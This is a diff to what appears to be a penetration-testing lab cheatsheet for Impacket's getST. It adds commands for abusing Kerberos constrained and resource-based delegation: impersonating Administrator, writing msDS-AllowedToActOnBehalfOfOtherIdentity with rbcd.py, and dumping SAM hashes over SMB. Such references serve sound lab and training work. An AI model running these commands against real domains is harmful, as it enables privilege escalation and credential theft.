@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=getst) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,75 @@ Requires the relevant delegation configuration/rights; credentials alone do not 
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=getST)
+## Notebook recipes
 
-## Learning and original examples
+5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
+<AccordionGroup>
+
+<Accordion title="Constrained (S4U)">
+
+### Constrained (S4U)
+
+**Kerberos Delegation: Quick Reference**
+
+```bash
+# You control an account with "allowed to delegate to" a service
+getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+nxc smb target -k --sam
+```
+
+</Accordion>
+
+<Accordion title="Resource-Based (RBCD)">
+
+### Resource-Based (RBCD)
+
+**Kerberos Delegation: Quick Reference**
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+</Accordion>
+
+<Accordion title="Delegation &amp; domain edges">
+
+### Delegation & domain edges
+
+**BloodHound: Full Reference**
+
+Context from the notebook: AllowedToDelegate Constrained delegation (S4U2Proxy) impacket-getST -spn &lt;spn> -impersonate Administrator 'dom/user:pass'
+
+```text
+impacket-getST -spn <spn> -impersonate Administrator 'dom/user:pass'
+```
+
+**BloodHound: Full Reference**
+
+Context from the notebook: AllowedToAct  (RBCD) You can configure RBCD on the target computer add a controlled computer, set  msDS-AllowedToActOnBehalfOfOtherIdentity , then  getST -impersonate Administrator
+
+```text
+getST -impersonate Administrator
+```
+
+</Accordion>
+
+<Accordion title="Impacket: Script Quick Reference">
+
+### Impacket: Script Quick Reference
+
+**Impacket: Script Quick Reference**
+
+Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py ,  getST.py Kerberos tools
+
+```text
+getST.py
+```
+
+</Accordion>
+
+</AccordionGroup>
